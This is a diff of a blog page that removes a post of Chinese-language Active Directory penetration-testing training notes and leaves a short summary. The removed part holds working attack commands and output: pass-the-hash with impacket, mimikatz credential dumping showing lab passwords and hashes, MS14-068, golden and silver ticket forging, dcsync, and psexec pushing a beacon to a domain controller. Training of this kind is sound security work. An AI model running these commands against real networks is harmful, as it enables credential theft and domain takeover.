@@ -350,7 +350,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-12-18 17:15:15" itemprop="dateModified" datetime="2025-12-18T17:15:15+08:00">2025-12-18</time>
+                <time title="Modified: 2025-12-24 02:37:31" itemprop="dateModified" datetime="2025-12-24T02:37:31+08:00">2025-12-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -387,154 +387,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <blockquote>
-<p> it基础设施：</p>
-<ol>
-<li>web</li>
-<li>企业内网</li>
-<li>云计算</li>
-<li>移动设备（APP）</li>
-<li>人工智能</li>
-<li>物联网</li>
-</ol>
-</blockquote>
-<h2 id="内网-外网"><a href="#内网-外网" class="headerlink" title="内网&amp;外网"></a>内网&amp;外网</h2><p>由于 IPv4枯竭 的问题出现，因此出现了内网地址（NAT）</p>
-<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><ol>
-<li>内网穿透<ol>
-<li>iox（简单好用，可以配合proxychains形成代理链）</li>
-<li>nps</li>
-</ol>
-</li>
-<li>横向移动</li>
-</ol>
-<h2 id="域介绍"><a href="#域介绍" class="headerlink" title="域介绍"></a>域介绍</h2><p>域是一个有安全边界的计算机集合。域控电脑可以控制域内所有账户，负责电脑连入和验证工作</p>
-<p>活动目录实现了域环境的核心功能——目录服务（LDAP）</p>
-<p><img src="/2025/12/10/%E3%80%90%E5%AE%89%E6%81%92%E5%9F%B9%E8%AE%AD%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251211093827826.png" alt="image-20251211093827826"></p>
-<p><img src="/2025/12/10/%E3%80%90%E5%AE%89%E6%81%92%E5%9F%B9%E8%AE%AD%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251211094329154.png" alt="image-20251211094329154"></p>
-<h3 id="Windows常见端口和对应的服务"><a href="#Windows常见端口和对应的服务" class="headerlink" title="Windows常见端口和对应的服务"></a>Windows常见端口和对应的服务</h3><p><strong>使用impacket进行攻击渗透</strong></p>
-<ol>
-<li><p>135 —— RPC协议</p>
-<p>Remote procedure call ，远程过程调用协议。WMI是微软实现的基于WEB的企业管理，支持访问本地和远程主机。WMI地层水基于分布式组件对象模型DCOM。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py dbapp.lab/user1:&#x27;123qwe!@#&#x27;@10.3.4.110 -codec=&#x27;GBK&#x27;</span><br><span class="line">Impacket v0.14.0.dev0+20251209.143744.82a5a8f0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] SMBv3.0 dialect used</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">C:\&gt;whoami</span><br><span class="line">dbapp\user1</span><br><span class="line"></span><br><span class="line">C:\&gt;dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 A623-059D</span><br><span class="line"></span><br><span class="line"> C:\ 的目录</span><br><span class="line"></span><br><span class="line">2025/12/17  09:43            48,004 .opennebula-context.out</span><br><span class="line">2025/12/17  09:43               615 .opennebula-startscript.ps1</span><br><span class="line">2021/10/09  09:05    &lt;DIR&gt;          drivers</span><br><span class="line">2019/12/07  17:14    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2025/12/17  09:46    &lt;DIR&gt;          Program Files</span><br><span class="line">2021/10/09  09:06    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2025/12/17  09:56    &lt;DIR&gt;          Users</span><br><span class="line">2025/12/17  09:57    &lt;DIR&gt;          Windows</span><br><span class="line">               2 个文件         48,619 字节</span><br><span class="line">               6 个目录 29,313,929,216 可用字节</span><br></pre></td></tr></table></figure>
-
-<p>NTLM 攻击方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py dbapp.lab/user1@10.3.4.110 -hashes :00AFFD88FA323B00D4560BF9FEF0EC2F -codec=&#x27;GBK&#x27;</span><br><span class="line">Impacket v0.14.0.dev0+20251209.143744.82a5a8f0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] SMBv3.0 dialect used</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">C:\&gt;whoami</span><br><span class="line">dbapp\user1</span><br><span class="line"></span><br><span class="line">C:\&gt;ps</span><br><span class="line">&#x27;ps&#x27; 不是内部或外部命令，也不是可运行的程序</span><br><span class="line">或批处理文件。</span><br><span class="line"></span><br><span class="line">C:\&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::15ff:3b95:72cc:5c3d%9</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.3.4.110</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.252.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.3.7.251</span><br><span class="line"></span><br><span class="line">以太网适配器 以太网 2:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::593:cbfa:64c2:c512%5</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.122.101</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.122.1</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>139 —— NetBIOS，网络基本输入输出会话服务</p>
-<p>NetBIOS 会话服务，NBT会话适用于包含SMB会话的轻量级协议。用于在老版本上支持SMB协议进行一些复杂的功能，比如文件共享和打印机服务。</p>
-</li>
-<li><p>445 —— SMB协议</p>
-<p>SMB（Server Message Block）文件共享服务。psexec 可以通过SMB连接到目标机器上获得交互终端。</p>
-</li>
-</ol>
-<h3 id="NTLM认证机制"><a href="#NTLM认证机制" class="headerlink" title="NTLM认证机制"></a>NTLM认证机制</h3><ul>
-<li><p>windows logon process</p>
-<p>用于管理用户登录和登出</p>
-</li>
-<li><p>LSASS进程</p>
-<p>用于系统的安全机制，用于本地安全和登录策略，将明文密码加密成NTLM哈希值。</p>
-</li>
-<li><p>SAM数据库</p>
-<p>用于存储用户密码的<strong>NTLM哈希值和LM哈希值（已不再使用）</strong>，存放于 C:\windows\system32\config\sam。在系统运行中是无法打开的，只能通过dump lsass获取。</p>
-<ul>
-<li><p>LM</p>
-<p>不再使用</p>
-</li>
-<li><p>NTLM</p>
-<p>NTLM协议是以NTLM哈希作为基础，进行加密验证的过程。基于挑战&#x2F;响应的认证机制，只支持windows，并且可以在域中和工作组中运行。</p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="Kerberos-认证机制"><a href="#Kerberos-认证机制" class="headerlink" title="Kerberos 认证机制"></a>Kerberos 认证机制</h3><p>Kerberos 是一种<strong>基于对称密钥和可信第三方的网络认证协议</strong>，核心目标是在<strong>不明文传输密码</strong>的情况下，实现客户端与服务器之间的<strong>安全身份认证</strong>。</p>
-<p><img src="/2025/12/10/%E3%80%90%E5%AE%89%E6%81%92%E5%9F%B9%E8%AE%AD%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251217104353743.png" alt="image-20251217104353743"></p>
-<p>Kerberos 体系中有三方：</p>
-<ol>
-<li><p><strong>Client（客户端）</strong></p>
-<p>请求访问服务的用户或主机</p>
-</li>
-<li><p><strong>Server &#x2F; Service（服务端）</strong></p>
-<p>提供具体服务的服务器（如文件服务、数据库等）</p>
-</li>
-<li><p><strong>KDC（Key Distribution Center，密钥分发中心）</strong></p>
-<p>可信第三方，通常由两部分组成：</p>
-<ul>
-<li><strong>AS（Authentication Server）</strong>：身份认证</li>
-<li><strong>TGS（Ticket Granting Server）</strong>：发放服务票据</li>
-</ul>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────┐┌──────────────────┐┌──────────────────┐┌──────────────────┐</span><br><span class="line">│      Client      ││        AS        ││       TGS        ││      Server      │</span><br><span class="line">└───┬──────────────┘└───┬──────────────┘└───┬──────────────┘└───┬──────────────┘</span><br><span class="line">    │                   │                   │                   │          </span><br><span class="line">    ────────────────────&gt;                                                    1. AS-REQ (用户名)</span><br><span class="line">    │                   │                   │                   │          </span><br><span class="line">    &lt;────────────────────                                                    2. AS-REP (TGT + Kc,tgs)</span><br><span class="line">    │                   │                   │                   │          </span><br><span class="line">        ======================================== 用户已登录（SSO）</span><br><span class="line">    │                   │                   │                   │          </span><br><span class="line">    ────────────────────────────────────────&gt;                                3. TGS-REQ (TGT + Auth + 服务名)</span><br><span class="line">    │                   │                   │                   │          </span><br><span class="line">    &lt;────────────────────────────────────────                                4. TGS-REP (ST + Kc,s)</span><br><span class="line">    │                   │                   │                   │          </span><br><span class="line">    ────────────────────────────────────────────────────────────&gt;            5. AP-REQ (ST + Auth)</span><br><span class="line">    │                   │                   │                   │          </span><br><span class="line">    &lt;───────────────────────────────────────────────────────────             6. AP-REP (时间戳 +1)</span><br></pre></td></tr></table></figure>
-
-<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>漏洞利用条件：</p>
-<ol>
-<li>任意域账户</li>
-<li>域账户密码</li>
-<li>SID</li>
-<li>域控服务器IP</li>
-</ol>
-<p>当进入靶机的 meterpreter 的shell之后，使用命令查看当前内存中所有的creds信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 371141 (00000000:0005a9c5)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ttao</span><br><span class="line">Domain            : MIRAGE</span><br><span class="line">Logon Server      : WIN-1JCHUI60DHS</span><br><span class="line">Logon Time        : 2025/12/17 14:24:24</span><br><span class="line">SID               : S-1-5-21-2476688485-4256841910-2155116890-1103</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ttao</span><br><span class="line">         * Domain   : MIRAGE</span><br><span class="line">         * LM       : 089d427cf0d287abb75e0c8d76954a50</span><br><span class="line">         * NTLM     : 79da2541787f8a39c671ba82af14d349</span><br><span class="line">         * SHA1     : 2117dcd4952d69fdc9e0cdc3f0e97478ba2bd192</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : ttao</span><br><span class="line">         * Domain   : MIRAGE</span><br><span class="line">         * Password : retro#123</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : ttao</span><br><span class="line">         * Domain   : MIRAGE</span><br><span class="line">         * Password : retro#123</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : ttao</span><br><span class="line">         * Domain   : MIRAGE.COM</span><br><span class="line">         * Password : retro#123</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
-
-<p>使用MS14-068工具创建该域用户的黄金票据：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ttao\Desktop&gt;.\MS14-068.exe -u ttao@mirage.com -p retro#123 -s S-1-5-21-2476688485-4256841910-2155116890-1103 -d 192.168.20.254</span><br><span class="line">  [+] Building AS-REQ for 192.168.20.254... Done!</span><br><span class="line">  [+] Sending AS-REQ to 192.168.20.254... Done!</span><br><span class="line">  [+] Receiving AS-REP from 192.168.20.254... Done!</span><br><span class="line">  [+] Parsing AS-REP from 192.168.20.254... Done!</span><br><span class="line">  [+] Building TGS-REQ for 192.168.20.254... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 192.168.20.254... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 192.168.20.254... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 192.168.20.254... Done!</span><br><span class="line">  [+] Creating ccache file &#x27;TGT_ttao@mirage.com.ccache&#x27;... Done!</span><br></pre></td></tr></table></figure>
-
-<p>使用mimikatz导入票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc xxx.ccache</span><br></pre></td></tr></table></figure>
-
-<p>使用psexec等工具执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe  \\WIN-1JCHUI60DHS.mirage.com -s cmd.exe</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>漏洞利用条件：</p>
-<ol>
-<li>域内krbtgt的NTLM哈希值</li>
-<li>域的SID（域用户的SID去掉最后一个字段）</li>
-<li>域名</li>
-</ol>
-<p>漏洞利用步骤</p>
-<ol>
-<li><p>获取krbtgt的哈希值、域的SID、域名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:mirage.com /user:krbtgt # 获取krbtgt的哈希值</span><br><span class="line">mimikatz sekurlsa::logonpasswords # 获取sid</span><br><span class="line">shell net user /domain # 获取域名、域控主机名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用mimikatz伪造一张黄金票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:administrator /domain:mirage.com /sid:S-1-5-21-2476688485-4256841910-2155116890 /krbtgt:0fa09e64e964aa459db48844b2242d88</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将黄金票据导入到当前服务器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用psexec等工具连接到目标服务器</p>
-</li>
-</ol>
-   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell PsExec.exe \\WIN-1JCHUI60DHS.mirage.com -s C:\DC-beacon_x64.exe</span><br></pre></td></tr></table></figure>
-
-<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>漏洞利用条件：</p>
-<ol>
-<li>域名</li>
-<li>域内SID</li>
-<li>目标服务器名称</li>
-<li>目标服务器（机器账户）的NTLM哈希值</li>
-</ol>
-<p>漏洞利用步骤：</p>
-<ol>
-<li><p>获取域名、域内SID、目标服务器名称、目标服务器的哈希值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain # 获取域名、域控主机名</span><br><span class="line">mimikatz sekurlsa::logonpasswords # 获取sid(或者：whoami /user)、目标服务器的NTLM哈希值</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用mimikatz伪造一张白银票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /user:administrator /domain:mirage.com /sid:S-1-5-21-2476688485-4256841910-2155116890 /target:WIN-1JCHUI60DHS.mirage.com /service:cifs /rc4:4bb66c3a60728e9c4cee1dda824b74ab /user:user /ticket:silver.kirbi</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>将白银票据导入到当前服务器，并访问特定服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt silver.kirbi</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过Kerberos向Web Server进行身份验证并需要代表该用户更新后端文件服务器上的记录的方案。这通常称为“ Kerberos双跳问题” ，并且要求进行委派，以便Web Server在修改数据库记录时模拟用户。需要注意的一点是接受委派的用户只能是<strong>服务账户</strong>或者<strong>计算机用户</strong>。</p>
-<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>被设置为约束性委派的服务能够调用<strong>S4U2Self</strong>向<strong>TGS</strong>为任意用户请求访问自身的可转发的服务票据，此后，便可通过<strong>S4U2Proxy</strong>使用这张<strong>TGS</strong>向域控制器请求访问<strong>B</strong>的票据。</p>
-<p><img src="/2025/12/10/%E3%80%90%E5%AE%89%E6%81%92%E5%9F%B9%E8%AE%AD%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20251218165457748-6048098.png" alt="image-20251218165457748"></p>
-
+          <p>主要介绍了域渗透相关知识，如kerberos、黄金票据、约束委派等</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2025/12/10/%E3%80%90%E5%AE%89%E6%81%92%E5%9F%B9%E8%AE%AD%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
